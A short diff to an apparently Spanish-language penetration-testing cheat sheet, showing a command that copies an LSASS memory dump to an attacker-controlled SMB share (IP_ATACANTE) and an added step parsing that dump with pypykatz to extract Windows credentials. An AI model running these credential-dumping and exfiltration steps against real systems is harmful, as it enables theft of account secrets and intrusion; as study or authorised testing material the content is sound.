@@ -466,6 +466,10 @@ Copiar el lsass en el servidor SMB
 ```
 cp lsass.dump \\IP_ATACANTE\share\lsass.dmp
 ```
+Parsear el lsass.dmp
+```
+pypykatz lsa minidump lsass.dmp
+```
 ### ldapdomaindump
 
 ```
